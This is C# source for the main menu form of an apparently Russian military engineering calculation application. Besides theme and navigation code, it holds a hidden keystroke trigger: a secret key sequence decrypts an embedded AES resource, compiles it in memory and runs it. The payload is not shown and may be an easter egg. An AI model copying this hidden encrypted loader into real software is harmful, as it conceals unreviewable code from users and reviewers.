using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using CalculationsCore;
using Microsoft.CSharp;
using ColorThemeManager;
using System.Linq;

namespace MilitaryEngineering
{
    public partial class MainMenuForm : Form
    {
        const string mainInfo = "МЕТОДИКИ ИНЖЕНЕРНЫХ РАСЧЕТОВ";
        const string fortificationInfo = "МЕТОДИКА РАСЧЕТА ФОРТИФИКАЦИОННОГО \nОБОРУДОВАНИЯ ПОЗИЦИЙ И РАЙОНОВ \nРАСПОЛОЖЕНИЯ ВОЙСК";
        const string fencingInfo = "МЕТОДИКА РАСЧЕТА СИСТЕМЫ ИНЖЕНЕРНЫХ ЗАГРАЖДЕНИЙ";
        Dictionary<Button, Type> formMap { get; set; }
        public string buffer;
        public bool coolFlag;
        private ThemeManager themeManager;
        private bool isStarting = true;
        public MainMenuForm()
        {
            InitializeComponent();
            this.KeyPreview = true;
            buffer = "";
            coolFlag = false;
            formMap = new Dictionary<Button, Type>()
            {
                { FortificationButton, typeof(Fortification.FortificationForm) }
            };

            themeManager = ThemeManager.GetInstance();
            SetColorTheme();
            isStarting = false;
        }

        private void SetColorTheme()
        {
            ColorTheme selectedTheme = themeManager.ColorTheme;

            ThemesBox.DataSource = themeManager.AllThemes;
            ThemesBox.DisplayMember = "Name";

            ThemesBox.SelectedIndex = themeManager.SelectedIndex;

            BackColor = selectedTheme.MainMainColor;

            InfoLabel.BackColor = selectedTheme.MainMainColor;
            InfoLabel.ForeColor = selectedTheme.MainForeColor;

            ThemeLabel.ForeColor = selectedTheme.SecondarySecondaryColor;

            LeftPanel.BackColor = selectedTheme.MainSecondaryColor;
            foreach (Button button in LeftPanel.Controls.OfType<Button>())
            {
                button.BackColor = selectedTheme.SecondaryMainColor;
                button.ForeColor = selectedTheme.SecondaryForeColor;
            }
            
        }

        private void DisplayButtonInfo(string displayInfo, Image displayImage)
        {
            if(!coolFlag)
            {
                InfoLabel.Text = displayInfo;
                PreviewPictureBox.Image = displayImage;
            }
        }

        private void FencingButton_MouseEnter(object sender, EventArgs e)
        {
            DisplayButtonInfo(fencingInfo, Properties.Resources.Fencing);
        }

        private void FortificationButton_MouseEnter(object sender, EventArgs e)
        {
            DisplayButtonInfo(fortificationInfo, Properties.Resources.Fortification);
        }

        private void DisplayMain(object sender, EventArgs e)
        {
            DisplayButtonInfo(mainInfo, Properties.Resources.Main);
        }

        private void Placeholder_MouseEnter(object sender, EventArgs e)
        {
            DisplayButtonInfo("ПРИЛОЖЕНИЕ ИМЕНИ КИСЕЛЯ А.Г.", Properties.Resources.Placeholder);
        }

        private void MainMenuForm_KeyDown(object sender, KeyEventArgs e)
        {
            buffer += e.KeyCode.ToString();
            string hash = GetHash(buffer + Properties.Resources.salt);
            if(hash == Properties.Resources.hashed)
            {
                CoolMethod(buffer + Properties.Resources.salt);
            }
        }

        void CoolMethod(string key)
        {
            byte[] bytes = Convert.FromBase64String(AESDecrypt(Properties.Resources.p4str, key));
            string code = Encoding.UTF8.GetString(bytes);
            
            CSharpCodeProvider provider = new CSharpCodeProvider();
            CompilerParameters parameters = new CompilerParameters();
            parameters.GenerateInMemory = true;
            parameters.GenerateExecutable = false;
            parameters.ReferencedAssemblies.Add("MilitaryEngineering.exe");
            parameters.ReferencedAssemblies.Add("System.Drawing.dll");
            parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            parameters.ReferencedAssemblies.Add("System.dll");
            CompilerResults results = provider.CompileAssemblyFromSource(parameters, code);
            Assembly assembly = results.CompiledAssembly;
            Type program = assembly.GetType("MilitaryEngineering.CoolClass");
            MethodInfo newFunction = program.GetMethod("CoolMethod");
            newFunction.Invoke(null, new object[] { this, key, Properties.Resources.p1str, Properties.Resources.p2str, Properties.Resources.p3str });
        }

        public string AESEncrypt(string input, string key)
        {
            using(AesManaged aes = new AesManaged())
            {
                using(MemoryStream memoryStream = new MemoryStream())
                {
                    byte[] bytes = new byte[16];
                    Array.Copy(Encoding.UTF8.GetBytes(key), bytes, 16);
                    ICryptoTransform transform = aes.CreateEncryptor(bytes, new byte[16]);
                    using(CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write))
                    {
                        using(StreamWriter streamWriter = new StreamWriter(cryptoStream))
                        {
                            streamWriter.Write(input);
                        }
                        return Convert.ToBase64String(memoryStream.ToArray());
                    }
                }
            }
        }

        public string AESDecrypt(string input, string key)
        {
            using(Aes aes = Aes.Create())
            {
                using(MemoryStream memoryStream = new MemoryStream(Convert.FromBase64String(input)))
                {
                    byte[] bytes = new byte[16];
                    Array.Copy(Encoding.UTF8.GetBytes(key), bytes, 16);
                    ICryptoTransform transform = aes.CreateDecryptor(bytes, new byte[16]);
                    using(CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Read))
                    {
                        using(StreamReader streamReader = new StreamReader(cryptoStream))
                        {
                            return streamReader.ReadToEnd();
                        }
                    }
                }
            }
        }

        string GetHash(string input)
        {
            using(SHA256 sha256 = SHA256.Create())
            {
                byte[] hashed = sha256.ComputeHash(Encoding.UTF8.GetBytes(input.ToCharArray()));
                string output = "";
                foreach(byte b in hashed)
                {
                    output += b.ToString("x2");
                }
                return output;
            }
        }

        private void Button_Click(object sender, EventArgs e)
        {
            if(formMap.ContainsKey(sender as Button))
            {
                Form newForm = (Form)Activator.CreateInstance(formMap[sender as Button]);
                newForm.FormClosed += (form, args) => Visible = true;
                newForm.Visible = true;
                Visible = false;
            }
            else
            {
                MessageBox.Show("This feature in not implemented yet");
            }
        }

        private void ThemesBox_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (isStarting)
            {
                return;
            }
            int newIndex = ThemesBox.SelectedIndex;
            themeManager.SelectedIndex = newIndex;
            SetColorTheme();
        }
    }
}
